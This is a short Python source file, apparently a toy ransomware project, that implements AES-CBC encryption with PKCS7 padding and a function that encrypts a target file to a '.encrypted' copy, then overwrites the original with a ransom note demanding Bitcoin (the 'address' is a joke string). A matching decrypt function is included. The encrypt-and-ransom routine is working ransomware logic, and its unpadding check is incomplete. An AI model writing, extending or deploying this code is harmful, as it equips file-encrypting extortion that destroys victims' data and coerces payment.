import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# AES works with blocks of fixed size (16 bytes).
BLOCK_SIZE = 16

def pad(data: bytes) -> bytes:
    """
    Pad the data using PKCS7 padding to ensure it's a multiple of BLOCK_SIZE.
    
    PKCS7 padding works by adding a number of bytes, each of which is equal to the number 
    of padding bytes required.
    """
    padding_length = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
    padding = bytes([padding_length] * padding_length)
    return data + padding

def unpad(data: bytes) -> bytes:
    """
    Remove the PKCS7 padding from the data.
    
    The last byte indicates the number of padding bytes added.
    """
    padding_length = data[-1]
    if padding_length > BLOCK_SIZE:
        raise ValueError("Invalid padding length.")
    return data[:-padding_length]

def encrypt_data(data: bytes, key: bytes, iv: bytes) -> bytes:
    """
    Encrypt the given data using AES in CBC mode.
    
    Inputs:
      - data: The plaintext data as bytes.
      - key: The AES encryption key as bytes.
      - iv: The initialization vector (IV) as bytes.
    
    Process:
      1. Pad the data to ensure it is a multiple of the block size.
      2. Create a new AES cipher object in CBC mode.
      3. Encrypt the padded data.
    
    Returns the encrypted data as bytes.
    """
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data)
    encrypted = cipher.encrypt(padded_data)
    return encrypted

def decrypt_data(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    """
    Decrypt the given encrypted data using AES in CBC mode.
    
    Inputs:
      - encrypted_data: The encrypted data as bytes.
      - key: The AES decryption key as bytes.
      - iv: The initialization vector (IV) as bytes.
    
    Process:
      1. Create a new AES cipher object in CBC mode.
      2. Decrypt the data.
      3. Unpad the decrypted data to retrieve the original plaintext.
    
    Returns the decrypted data as bytes.
    """
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted_data)
    return unpad(decrypted_padded)

def encrypt_file(file_path: str, key: bytes, iv: bytes) -> None:
    """
    Encrypt the file at the given file path, save the encrypted data to a backup file,
    and then replace the original file's content with a ransom note.
    """
    # Read the original file in binary mode
    with open(file_path, 'rb') as file:
        data = file.read()
    
    # Encrypt the data (using your existing encrypt_data function)
    encrypted = encrypt_data(data, key, iv)
    
    # Save the encrypted data to a backup file (e.g., append .encrypted to the filename)
    backup_file = file_path + ".encrypted"
    with open(backup_file, 'wb') as file:
        file.write(encrypted)
    
    # Overwrite the original file with a ransom note (in text mode)
    ransom_note = (
        "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
        "To recover your files, send 1 Bitcoin to the following address:\n"
        "Daniel-is-super-awesome!!!\n\n"
        "Then run the decryption tool and enter your decryption key and IV.\n"
        "Failure to do so will result in permanent data loss."
    )
    with open(file_path, 'w') as file:
        file.write(ransom_note)

def decrypt_file(file_path: str, key: bytes, iv: bytes) -> None:
    """
    Decrypts the file at the given file path.
    
    Inputs:
      - file_path: Path to the file to decrypt.
      - key: AES decryption key as bytes.
      - iv: Initialization vector (IV) as bytes.
    
    Process:
      1. Read the encrypted file contents.
      2. Decrypt the data.
      3. Write the original data back to the file.
    """
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted = decrypt_data(encrypted_data, key, iv)
    with open(file_path, 'wb') as file:
        file.write(decrypted)
